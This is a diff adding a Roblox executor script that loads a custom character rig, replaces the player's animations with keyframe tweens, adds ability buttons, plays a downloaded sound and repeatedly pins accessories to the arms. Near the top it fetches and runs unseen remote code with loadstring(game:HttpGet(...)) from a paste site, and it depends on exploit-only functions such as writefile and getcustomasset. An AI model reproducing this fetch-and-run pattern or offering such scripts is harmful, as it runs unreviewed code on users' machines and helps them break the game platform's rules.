@@ -1,0 +1,395 @@
+-- Get the TextChatService
+local TextChatService = game:GetService("TextChatService")
+
+-- Function to send a chat message
+local function sendChatMessage(message)
+    -- Check if TextChatService is available
+    if TextChatService then
+        -- Send the message to the default chat channel
+        local chatChannel = TextChatService.TextChannels.RBXGeneral
+        if chatChannel then
+            chatChannel:SendAsync(message)
+        else
+            warn("Default chat channel (RBXGeneral) not found!")
+        end
+    else
+        warn("TextChatService is not available!")
+    end
+end
+
+sendChatMessage("-gh 131754736922293 113830341361146 71632766123523 79864837399966 119822443745319 18641142410 128580644939147")
+Wait(5)
+
+loadstring(game:HttpGet("https://pastefy.app/5Vq2C3Te/raw"))()
+
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+writefile("COMPASS.mp3", game:HttpGet("https://github.com/ian49972/smth/raw/refs/heads/main/COMPASS.mp3"))
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+
+-- keyframe tween builder --
+
+local tStyle = {
+	[Enum.PoseEasingStyle.Linear] = Enum.EasingStyle.Linear,
+	[Enum.PoseEasingStyle.Bounce] = Enum.EasingStyle.Bounce,
+	[Enum.PoseEasingStyle.Cubic] = Enum.EasingStyle.Cubic,
+	[Enum.PoseEasingStyle.Elastic] = Enum.EasingStyle.Elastic,
+	[Enum.PoseEasingStyle.Constant] = Enum.EasingStyle.Linear,
+}
+local tDirection = {
+	[Enum.PoseEasingDirection.In] = Enum.EasingDirection.In,
+	[Enum.PoseEasingDirection.Out] = Enum.EasingDirection.Out,
+	[Enum.PoseEasingDirection.InOut]= Enum.EasingDirection.InOut,
+}
+
+local function BuildTweens(Model, KeyFrameSequence)
+	local frames = {}
+	for _, kf in ipairs(KeyFrameSequence:GetKeyframes()) do
+		table.insert(frames, {Time = kf.Time, Keyframe = kf})
+	end
+	table.sort(frames, function(a,b) return a.Time < b.Time end)
+
+	local tweens, motors, values, keyPoses = {}, {}, {}, {}
+	local function GetMotorFromPose(pose)
+		for _,v in pairs(Model:GetDescendants()) do
+			if v:IsA("Motor6D") and v.Part1 and v.Part0 and v.Part1.Name == pose.Name and v.Part0.Name == pose.Parent.Name then
+				return v
+			end
+		end
+	end
+
+	for i,frame in ipairs(frames) do
+		for _, pose in ipairs(frame.Keyframe:GetDescendants()) do
+			if pose:IsA("Pose") and pose.Weight > 0 then
+				local motor = motors[pose.Name] or GetMotorFromPose(pose)
+				if not keyPoses[i] then keyPoses[i] = {Time = frame.Time, Poses={}} end
+				if not motors[pose.Name] then motors[pose.Name] = motor end
+				if not values[pose.Name] then
+					local cv = Instance.new("CFrameValue")
+					cv.Value = motor.Transform
+					cv.Parent = motor
+					values[pose.Name] = cv
+				end
+				if motor then
+					keyPoses[i].Poses[pose.Name] = {Motor=motor, Pose=pose}
+				end
+			end
+		end
+	end
+
+	if #keyPoses > 1 then
+		local last = {}
+		for i=1,#keyPoses-1 do
+			local k1, k2 = keyPoses[i], keyPoses[i+1]
+			local dur = k2.Time - k1.Time
+			tweens[i] = {Time=dur, Tweens={}}
+			for n,d in pairs(k1.Poses) do last[n]=d end
+			for n,d in pairs(k2.Poses) do
+				local info = TweenInfo.new(
+					math.abs(last[n].Pose:FindFirstAncestorOfClass("Keyframe").Time - k2.Time),
+					tStyle[last[n].Pose.EasingStyle],
+					tDirection[last[n].Pose.EasingDirection]
+				)
+				tweens[i].Tweens[n] = TweenService:Create(values[n], info, {Value=d.Pose.CFrame})
+			end
+		end
+	end
+
+	return tweens, motors, values
+end
+
+local function PlayKeyframeSequence(Model, KeyFrameSequence, looped, onFinished)
+	local tweens, motors, values = BuildTweens(Model, KeyFrameSequence)
+	local stopped = false
+
+	local hb
+	hb = RunService.Heartbeat:Connect(function()
+		if stopped then hb:Disconnect() return end
+		for n,motor in pairs(motors) do
+			motor.Transform = values[n].Value
+		end
+	end)
+
+	local function loop()
+		repeat
+			for _, segment in ipairs(tweens) do
+				for _, tw in pairs(segment.Tweens) do tw:Play() end
+				task.wait(segment.Time)
+				if stopped then break end
+			end
+			if not looped and not stopped then
+				stopped = true
+				if onFinished then onFinished() end
+				break
+			end
+		until stopped
+	end
+
+	task.spawn(loop)
+
+	return function()
+		stopped = true
+	end
+end
+
+-- animations setup --
+
+local Object = game:GetObjects("rbxassetid://102046170699445")[1]
+Object.Parent = workspace
+Object:PivotTo(character:GetPivot())
+local rig = Object:FindFirstChild("RigJOHNDOE")
+local animsaves = rig:FindFirstChild("AnimSaves")
+
+local safe = Instance.new("Folder")
+safe.Name = "SafeKeyframes"
+safe.Parent = player:WaitForChild("PlayerGui")
+
+local idleKF = animsaves.idle:Clone()
+local walkKF = animsaves.walk:Clone()
+local runKF = animsaves.run:Clone()
+local footprintKF = animsaves.footprint:Clone()
+local corruptKF = animsaves.corruptENERGY:Clone()
+local m1KF = animsaves.m1:Clone()
+local introKF = animsaves.intro:Clone()
+
+idleKF.Parent, walkKF.Parent, runKF.Parent = safe, safe, safe
+footprintKF.Parent, corruptKF.Parent, m1KF.Parent, introKF.Parent = safe, safe, safe, safe
+Object:Destroy()
+
+local currentStopper
+local currentAnim
+
+local function playAnim(anim, looped, onFinished)
+	if currentAnim ~= anim then
+		if currentStopper then currentStopper() end
+		local animator = humanoid:FindFirstChildOfClass("Animator")
+		if animator then animator.Parent = nil end
+		currentAnim = anim
+		currentStopper = PlayKeyframeSequence(character, anim, looped, function()
+			currentAnim = nil
+			if onFinished then onFinished() end
+		end)
+	end
+end
+
+-- intro first --
+playAnim(introKF, false)
+
+local isRunning = false
+local defaultSpeed, runSpeed = 16, 28
+humanoid.WalkSpeed = defaultSpeed
+
+RunService.RenderStepped:Connect(function()
+	if currentAnim == introKF or currentAnim == footprintKF or currentAnim == corruptKF or currentAnim == m1KF then return end
+	local moving = humanoid.MoveDirection.Magnitude > 0.1
+	if moving then
+		if isRunning then
+			playAnim(runKF, true)
+		else
+			playAnim(walkKF, true)
+		end
+	else
+		playAnim(idleKF, true)
+	end
+end)
+
+-- gui buttons --
+
+local PlayerGui = player:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AbilityUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+local function makeButton(name, pos, color, func)
+	local btn = Instance.new("TextButton")
+	btn.Name = name
+	btn.Size = UDim2.new(0, 120, 0, 40)
+	btn.Position = pos
+	btn.BackgroundColor3 = color
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 18
+	btn.Text = name
+	btn.Parent = screenGui
+	btn.MouseButton1Click:Connect(func)
+end
+
+makeButton("Run", UDim2.new(0, 20, 1, -50), Color3.fromRGB(255, 50, 50), function()
+	isRunning = not isRunning
+	humanoid.WalkSpeed = isRunning and runSpeed or defaultSpeed
+	local btn = screenGui.Run
+	btn.Text = isRunning and "Running..." or "Run"
+	btn.BackgroundColor3 = isRunning and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 50, 50)
+end)
+
+makeButton("Footprint", UDim2.new(0, 160, 1, -50), Color3.fromRGB(50, 150, 255), function()
+	playAnim(footprintKF, false)
+end)
+
+makeButton("Corrupt", UDim2.new(0, 300, 1, -50), Color3.fromRGB(150, 50, 255), function()
+	playAnim(corruptKF, false)
+end)
+
+makeButton("M1", UDim2.new(0, 440, 1, -50), Color3.fromRGB(255, 150, 50), function()
+	playAnim(m1KF, false)
+end)
+
+-- compass sound --
+
+local sound = Instance.new("Sound")
+sound.Name = "CompassSound"
+sound.SoundId = getcustomasset("COMPASS.mp3")
+sound.Volume = 1
+sound.Looped = true
+sound.Parent = workspace
+sound:Play()
+
+humanoid.Died:Connect(function()
+	if sound then sound:Stop() sound:Destroy() end
+	if currentStopper then currentStopper() end
+	if screenGui then screenGui:Destroy() end
+	local animator = humanoid:FindFirstChildOfClass("Animator")
+	if animator and not animator.Parent then
+		animator.Parent = humanoid
+	end
+end)
+
+local player = game.Players.LocalPlayer
+local char = player.Character
+local Align = function(Part0, Part1,Mesh)
+    local Aligns = {
+        AlignOrientation = Instance.new("AlignOrientation", Part0),
+        AlignPosition = Instance.new("AlignPosition", Part0)
+    }
+    
+    local Attachments = {
+        Attach0 = Instance.new("Attachment", Part0),
+        Attach1 = Instance.new("Attachment", Part1)
+    }
+    local m = Part0:FindFirstChildOfClass('SpecialMesh')--This will get the first "SpecialMesh" it finds if it does not find any, then it will return nil
+    if Mesh and m then --If Mesh is set to true and it finds a mesh it will destroy it
+        m:Destroy()
+    end
+    Part0:BreakJoints()
+    Aligns.AlignOrientation.Attachment0 = Attachments.Attach0
+    Aligns.AlignOrientation.Attachment1 = Attachments.Attach1
+    Aligns.AlignOrientation.Responsiveness = math.huge
+    Aligns.AlignOrientation.RigidityEnabled = true
+    
+    Aligns.AlignPosition.Attachment0 = Attachments.Attach0
+    Aligns.AlignPosition.Attachment1 = Attachments.Attach1
+    Aligns.AlignPosition.Responsiveness = math.huge
+    Aligns.AlignPosition.RigidityEnabled = true
+        Aligns.AlignPosition.MaxForce = 999999999
+        spawn(function()
+            while _G.loop do 
+                local mag = (Part0.Position - (Part1.CFrame*Attachments.Attach0.CFrame:Inverse()).p).magnitude--magnitude can get the distance between two cframe or position
+                if mag >= 5 then 
+                Part0.CFrame = Part1.CFrame*Attachments.Attach0.CFrame:Inverse()
+                end
+                Part0.Velocity = Vector3.new(0,35,0)
+                game['Run Service'].Heartbeat:wait()
+                end
+        end)
+ return {Attachments.Attach0, Attachments, Aligns}
+        
+end 
+local hat = Align(char['Accessory (NoobLeftArm)'].Handle,char['Left Arm'],false)
+local cf = char['Left Arm'].CFrame*CFrame.new(0, 0, 0)*CFrame.Angles(math.rad(0),math.rad(90),0)
+hat[1].CFrame = cf:Inverse() * char['Left Arm'].CFrame
+
+local player = game.Players.LocalPlayer
+local char = player.Character
+local Align = function(Part0, Part1,Mesh)
+    local Aligns = {
+        AlignOrientation = Instance.new("AlignOrientation", Part0),
+        AlignPosition = Instance.new("AlignPosition", Part0)
+    }
+    
+    local Attachments = {
+        Attach0 = Instance.new("Attachment", Part0),
+        Attach1 = Instance.new("Attachment", Part1)
+    }
+    local m = Part0:FindFirstChildOfClass('SpecialMesh')--This will get the first "SpecialMesh" it finds if it does not find any, then it will return nil
+    if Mesh and m then --If Mesh is set to true and it finds a mesh it will destroy it
+        m:Destroy()
+    end
+    Part0:BreakJoints()
+    Aligns.AlignOrientation.Attachment0 = Attachments.Attach0
+    Aligns.AlignOrientation.Attachment1 = Attachments.Attach1
+    Aligns.AlignOrientation.Responsiveness = math.huge
+    Aligns.AlignOrientation.RigidityEnabled = true
+    
+    Aligns.AlignPosition.Attachment0 = Attachments.Attach0
+    Aligns.AlignPosition.Attachment1 = Attachments.Attach1
+    Aligns.AlignPosition.Responsiveness = math.huge
+    Aligns.AlignPosition.RigidityEnabled = true
+        Aligns.AlignPosition.MaxForce = 999999999
+        spawn(function()
+            while _G.loop do 
+                local mag = (Part0.Position - (Part1.CFrame*Attachments.Attach0.CFrame:Inverse()).p).magnitude--magnitude can get the distance between two cframe or position
+                if mag >= 5 then 
+                Part0.CFrame = Part1.CFrame*Attachments.Attach0.CFrame:Inverse()
+                end
+                Part0.Velocity = Vector3.new(0,35,0)
+                game['Run Service'].Heartbeat:wait()
+                end
+        end)
+ return {Attachments.Attach0, Attachments, Aligns}
+        
+end 
+local hat = Align(char['Accessory (Spike ArmAccessory)'].Handle,char['Right Arm'],false)
+local cf = char['Right Arm'].CFrame*CFrame.new(0, 0, 0)*CFrame.Angles(math.rad(0),math.rad(0),0)
+hat[1].CFrame = cf:Inverse() * char['Right Arm'].CFrame
+
+local player = game.Players.LocalPlayer
+local char = player.Character
+local Align = function(Part0, Part1,Mesh)
+    local Aligns = {
+        AlignOrientation = Instance.new("AlignOrientation", Part0),
+        AlignPosition = Instance.new("AlignPosition", Part0)
+    }
+    
+    local Attachments = {
+        Attach0 = Instance.new("Attachment", Part0),
+        Attach1 = Instance.new("Attachment", Part1)
+    }
+    local m = Part0:FindFirstChildOfClass('SpecialMesh')--This will get the first "SpecialMesh" it finds if it does not find any, then it will return nil
+    if Mesh and m then --If Mesh is set to true and it finds a mesh it will destroy it
+        m:Destroy()
+    end
+    Part0:BreakJoints()
+    Aligns.AlignOrientation.Attachment0 = Attachments.Attach0
+    Aligns.AlignOrientation.Attachment1 = Attachments.Attach1
+    Aligns.AlignOrientation.Responsiveness = math.huge
+    Aligns.AlignOrientation.RigidityEnabled = true
+    
+    Aligns.AlignPosition.Attachment0 = Attachments.Attach0
+    Aligns.AlignPosition.Attachment1 = Attachments.Attach1
+    Aligns.AlignPosition.Responsiveness = math.huge
+    Aligns.AlignPosition.RigidityEnabled = true
+        Aligns.AlignPosition.MaxForce = 999999999
+        spawn(function()
+            while _G.loop do 
+                local mag = (Part0.Position - (Part1.CFrame*Attachments.Attach0.CFrame:Inverse()).p).magnitude--magnitude can get the distance between two cframe or position
+                if mag >= 5 then 
+                Part0.CFrame = Part1.CFrame*Attachments.Attach0.CFrame:Inverse()
+                end
+                Part0.Velocity = Vector3.new(0,35,0)
+                game['Run Service'].Heartbeat:wait()
+                end
+        end)
+ return {Attachments.Attach0, Attachments, Aligns}
+        
+end 
+local hat = Align(char['Accessory (LLL)'].Handle,char['Left Arm'],false)
+local cf = char['Left Arm'].CFrame*CFrame.new(0, -0.7, 0)*CFrame.Angles(math.rad(0),math.rad(0),0)
+hat[1].CFrame = cf:Inverse() * char['Left Arm'].CFrame
